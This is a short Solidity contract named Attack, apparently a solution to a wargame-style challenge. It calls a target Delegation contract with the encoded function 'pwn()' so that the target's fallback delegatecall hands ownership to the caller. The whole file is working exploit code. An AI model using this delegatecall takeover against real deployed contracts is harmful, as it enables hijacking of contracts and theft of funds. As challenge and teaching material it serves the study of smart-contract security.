// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Delegation} from "./Delegation.sol";

contract Attack {
    Delegation public delegation;

    constructor(Delegation _delegation){
        delegation = Delegation(_delegation);
    }

    function callFallback() external{
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success,) = address(delegation).call(payload);
        require(success);
    }

}